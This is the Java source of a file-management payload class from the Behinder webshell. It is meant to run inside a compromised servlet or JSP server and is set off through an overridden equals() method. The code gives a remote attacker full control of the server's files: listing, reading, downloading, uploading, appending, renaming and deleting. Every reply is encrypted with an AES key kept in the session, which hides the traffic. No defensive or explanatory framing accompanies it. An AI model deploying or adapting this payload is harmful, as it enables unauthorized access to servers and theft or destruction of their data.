package net.rebeyond.behinder.payload.java;

import sun.misc.BASE64Decoder;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import java.io.*;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.*;

public class FileOperation {
    public static String mode;
    public static String path;
    public static String newPath;
    public static String content;
    public static String charset;
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;
    private final Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));

    public FileOperation() {
    }

    public boolean equals(Object obj) {
        PageContext page = (PageContext) obj;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        this.Request = page.getRequest();
        this.Response.setCharacterEncoding("UTF-8");
        Object result = new HashMap();

        try {
            if (mode.equalsIgnoreCase("list")) {
                ((Map) result).put("msg", this.list(page));
                ((Map) result).put("status", "success");
            } else if (mode.equalsIgnoreCase("show")) {
                ((Map) result).put("msg", this.show(page));
                ((Map) result).put("status", "success");
            } else if (mode.equalsIgnoreCase("delete")) {
                result = this.delete(page);
            } else if (mode.equalsIgnoreCase("create")) {
                ((Map) result).put("msg", this.create(page));
                ((Map) result).put("status", "success");
            } else if (mode.equalsIgnoreCase("append")) {
                ((Map) result).put("msg", this.append(page));
                ((Map) result).put("status", "success");
            } else {
                if (mode.equalsIgnoreCase("download")) {
                    this.download(page);
                    return true;
                }

                if (mode.equalsIgnoreCase("rename")) {
                    result = this.renameFile(page);
                } else if (mode.equalsIgnoreCase("createFile")) {
                    ((Map) result).put("msg", this.createFile(page));
                    ((Map) result).put("status", "success");
                } else if (mode.equalsIgnoreCase("createDirectory")) {
                    ((Map) result).put("msg", this.createDirectory(page));
                    ((Map) result).put("status", "success");
                }
            }
        } catch (Exception var6) {
            ((Map) result).put("msg", var6.getMessage());
            ((Map) result).put("status", "fail");
        }

        try {
            ServletOutputStream so = this.Response.getOutputStream();
            so.write(this.Encrypt(this.buildJson((Map) result, true).getBytes(StandardCharsets.UTF_8)));
            so.flush();
            so.close();
            page.getOut().clear();
        } catch (Exception var5) {
            var5.printStackTrace();
        }

        return true;
    }

    private String list(PageContext page) throws Exception {
        String result = "";
        File f = new File(path);
        List objArr = new ArrayList();
        if (f.isDirectory()) {
            File[] var5 = f.listFiles();
            int var6 = var5.length;

            for (int var7 = 0; var7 < var6; ++var7) {
                File temp = var5[var7];
                Map obj = new HashMap();
                obj.put("type", temp.isDirectory() ? "directory" : "file");
                obj.put("name", temp.getName());
                obj.put("size", temp.length() + "");
                obj.put("perm", temp.canRead() + "," + temp.canWrite() + "," + temp.canExecute());
                obj.put("lastModified", (new SimpleDateFormat("yyyy/MM/dd HH:mm:ss")).format(new Date(temp.lastModified())));
                objArr.add(obj);
            }
        } else {
            Map obj = new HashMap();
            obj.put("type", f.isDirectory() ? "directory" : "file");
            obj.put("name", new String(f.getName().getBytes(this.osCharset), "GBK"));
            obj.put("size", f.length() + "");
            obj.put("lastModified", (new SimpleDateFormat("yyyy-MM-dd HH:mm:ss")).format(new Date(f.lastModified())));
            objArr.add(obj);
        }

        result = this.buildJsonArray(objArr, true);
        return result;
    }

    private String show(PageContext page) throws Exception {
        if (charset == null) {
            charset = System.getProperty("file.encoding");
        }

        StringBuffer sb = new StringBuffer();
        File f = new File(path);
        if (f.exists() && f.isFile()) {
            InputStreamReader isr = new InputStreamReader(new FileInputStream(f), charset);
            BufferedReader br = new BufferedReader(isr);
            String str = null;

            while ((str = br.readLine()) != null) {
                sb.append(str + "\n");
            }

            br.close();
            isr.close();
        }

        return sb.toString();
    }

    private String create(PageContext page) throws Exception {
        String result = "";
        FileOutputStream fso = new FileOutputStream(path);
        fso.write((new BASE64Decoder()).decodeBuffer(content));
        fso.flush();
        fso.close();
        result = path + "上传完成，远程文件大小:" + (new File(path)).length();
        return result;
    }

    private Map renameFile(PageContext page) throws Exception {
        Map result = new HashMap();
        File oldFile = new File(path);
        File newFile = new File(newPath);
        if (oldFile.exists() && oldFile.isFile() & oldFile.renameTo(newFile)) {
            result.put("status", "success");
            result.put("msg", "重命名完成:" + newPath);
        } else {
            result.put("status", "fail");
            result.put("msg", "重命名失败:" + newPath);
        }

        return result;
    }

    private String createFile(PageContext page) throws Exception {
        String result = "";
        FileOutputStream fso = new FileOutputStream(path);
        fso.close();
        result = path + "创建完成";
        return result;
    }

    private String createDirectory(PageContext page) throws Exception {
        String result = "";
        File dir = new File(path);
        dir.mkdirs();
        result = path + "创建完成";
        return result;
    }

    private void download(PageContext page) throws Exception {
        FileInputStream fis = new FileInputStream(path);
        byte[] buffer = new byte[1024000];
        int length;
        ServletOutputStream sos = page.getResponse().getOutputStream();

        while ((length = fis.read(buffer)) > 0) {
            sos.write(Arrays.copyOfRange(buffer, 0, length));
        }

        sos.flush();
        sos.close();
        fis.close();
    }

    private String append(PageContext page) throws Exception {
        String result = "";
        FileOutputStream fso = new FileOutputStream(path, true);
        fso.write((new BASE64Decoder()).decodeBuffer(content));
        fso.flush();
        fso.close();
        result = path + "追加完成，远程文件大小:" + (new File(path)).length();
        return result;
    }

    private Map delete(PageContext page) throws Exception {
        Map result = new HashMap();
        File f = new File(path);
        if (f.exists()) {
            if (f.delete()) {
                result.put("status", "success");
                result.put("msg", path + " 删除成功.");
            } else {
                result.put("status", "fail");
                result.put("msg", "文件" + path + "存在，但是删除失败.");
            }
        } else {
            result.put("status", "fail");
            result.put("msg", "文件不存在.");
        }

        return result;
    }

    private String buildJsonArray(List list, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        sb.append("[");

        for (Object o : list) {
            Map entity = (Map) o;
            sb.append(this.buildJson(entity, encode) + ",");
        }

        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }

        sb.append("]");
        return sb.toString();
    }

    private String buildJson(Map entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");

        for (Object o : entity.keySet()) {
            String key = (String) o;
            sb.append("\"" + key + "\":\"");
            String value = ((String) entity.get(key));
            if (encode) {
                Class Base64;
                Object Encoder;
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    Base64 = Class.forName("java.util.Base64");
                    Encoder = Base64.getMethod("getEncoder", (Class[]) null).invoke(Base64, (Object[]) null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes(StandardCharsets.UTF_8));
                } else {
                    this.getClass();
                    Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Encoder = Base64.newInstance();
                    value = (String) Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes(StandardCharsets.UTF_8));
                    value = value.replace("\n", "").replace("\r", "");
                }
            }

            sb.append(value);
            sb.append("\",");
        }

        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }

        sb.append("}");
        return sb.toString();
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        String key = this.Session.getAttribute("u").toString();
        byte[] raw = key.getBytes(StandardCharsets.UTF_8);
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        byte[] encrypted = cipher.doFinal(bs);
        return encrypted;
    }
}
